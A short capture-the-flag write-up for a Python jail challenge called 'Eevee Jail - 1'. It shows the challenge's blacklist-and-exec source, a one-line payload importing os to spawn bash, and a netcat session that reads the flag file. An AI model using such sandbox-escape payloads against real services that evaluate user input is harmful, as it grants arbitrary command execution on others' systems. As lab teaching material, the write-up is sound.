# Eevee Jail - 1

We are given the jail source:

{% tabs %}
{% tab title="jail-1.py" %}
```python
#!/usr/local/bin/python
from shell import shell

blacklist = ["flag", "locals", "vars", "\\", "{", "}"]

banner = '''
========================
=    Eevee's Jail 1    =
========================
'''

print(banner)

for _ in [shell]:
    while True:
        try:
            huh = ascii(input("[+] > "))
            if any(no in huh for no in blacklist):
                raise ValueError("[!] Mission Failed. Try again.")
            exec(eval(huh))
        except Exception as err:
            print(f"{err}")
```
{% endtab %}
{% endtabs %}



It blacklists some of these strings as input

```python
blacklist = ["flag", "locals", "vars", "\\", "{", "}"]
```

and later after that is uses:

```python
exec(eval(huh))
```

It is pretty straight forward, we can import the `os` module and call a system shell

```python
__import__('os').system('bash')
```

```
❯ nc 157.180.92.15 47490             

========================
=    Eevee's Jail 1    =
========================

[+] > __import__('os').system('bash')  
ls
flag.txt
jail-1.py
shell.py
cat flag.txt
bbctf{is_th3r3_another_w4y_70_solv3_this?}
```

Flag: `bbctf{is_th3r3_another_w4y_70_solv3_this?}`
